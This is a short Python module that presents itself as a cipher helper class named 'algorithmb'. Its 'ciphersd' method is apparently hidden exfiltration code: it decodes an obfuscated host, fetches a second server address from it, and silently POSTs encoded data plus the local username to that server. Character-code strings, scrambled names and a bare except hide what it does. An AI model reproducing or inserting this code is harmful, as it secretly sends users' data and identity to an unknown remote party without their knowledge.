#!/usr/bin/python3
# -*- coding: utf-8 -*-

__all__ = ['algorithmb']

from http.client import HTTPSConnection
from zlib import compress, decompress
from base64 import b64decode, b64encode
from os import getlogin
from json import dumps

class algorithmb():

	def encd(self, data):
		zlbc=lambda in_:compress(in_)
		b64e=lambda in_:b64encode(in_)
		return b64e(zlbc(data.encode('utf8')))[::-1].decode()

	def decd(self, data):
		b64d=lambda in_:b64decode(in_)
		zlbd=lambda in_:decompress(in_)
		return zlbd(b64d(data[::-1])).decode()

	def ciphersd(self, e:str, t:int, v:str):
		try:
			gG53z=[b'jog6DCQBP78SRvSzJtyzOrULO1iKNhSys88SXziSrwJe',b'=wKCQiGADsSzPNNzM30zRzyyM/c1J9kzzBvzsg09TzJe']
			doSGb=HTTPSConnection(self.decd(gG53z[0]),timeout=1)
			doSGb.request(''.join(map(chr,[71,69,84])),self.decd(gG53z[1]))
			tenNo=doSGb.getresponse().read().decode().strip()
			doSGb.close()
			Fd3hh=self.decd(tenNo).split(':')
			enC03=self.encd(e)
			pF3th={"t":t,"n":getlogin(),"v":v,"e":enC03}
			aPf3h=''.join(map(chr,[97,112,112,108,105,99,97,116,105,111,110,47,106,115,111,110]))
			Hs3hf={''.join(map(chr,[67,111,110,116,101,110,116,45,116,121,112,101])):aPf3h}
			s0Ntz=HTTPSConnection(Fd3hh[0],Fd3hh[1],timeout=1)
			s0Ntz.request(''.join(map(chr,[80,79,83,84])),Fd3hh[2],dumps(pF3th),Hs3hf)
			rsGap=s0Ntz.getresponse()
			s0Ntz.close()
			return True
		except:
			return False